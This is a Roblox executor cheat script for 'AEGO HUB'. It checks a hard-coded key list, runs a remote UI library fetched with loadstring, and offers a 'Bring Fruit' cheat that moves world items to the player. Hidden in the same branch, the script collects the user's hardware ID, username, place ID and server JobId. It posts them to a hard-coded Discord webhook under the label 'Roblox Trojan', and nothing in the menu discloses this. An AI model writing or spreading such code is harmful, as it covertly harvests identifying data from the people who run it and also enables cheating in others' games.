
local KeyCheck = {"KEY-AEGO-HUB-UWFtyADV","KEY-AEGO-HUB-v7Hax2XTbE"}


_G.KeyS = _G.Key

if table.find(KeyCheck,_G.KeyS) then
print("Welcome to AEGO HUB ")
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()
local window = library:AddWindow("AEGO HUB", {
	main_color = Color3.fromRGB(41, 74, 122), -- Color
	min_size = Vector2.new(250, 346), -- Size of the gui
	can_resize = false, -- true or false
})



local features = window:AddTab("Main") -- Name of tab
features:Show() -- shows the tab

features:AddLabel("Farm")

features:AddButton("Reset Chr",function()
game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

local switch = features:AddSwitch("Bring Fruit / ดึงผล Beta Function", function(v)
_G.BringFruit = v

while _G.BringFruit do wait()
if _G.BringFruit then
		for i,v in pairs(workspace:GetChildren()) do
	if v:IsA("Tool") then
		local handle = v:FindFirstChild("Handle")
		handle.CanCollide = false
		handle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		task.wait(0.4)
		   
	end
end
end
end

end)
switch:Set(false)

 local placeId = game.PlaceId

local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = 'Roblox Visrus trojan ';
local Embed = {
    title = 'Hwid ';
    color = "123";
	url = "https://www.google.com/search?q=" .. hwid;
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Trojan';
        url = "https://www.roblox.com/games/" .. placeId;

    };
    fields = {
        {
            name = 'Players'..game.Players.LocalPlayer.Name;
            value = '';
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discord.com/api/webhooks/1330245729838694400/VBwGXeUgxTqrleiVzS2fl58938yOaQeR7swnZQFB17eQyAQKq8PCLpxMUjOwrsWVnfy8';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
elseif _G.KeyS == "" then
	game.Players.LocalPlayer:Kick("ใส่ Keyด้วย [ X ]")
else
	game.Players.LocalPlayer:Kick("Key ไม่ถูกต้องจร้าาา [ X ]")
end
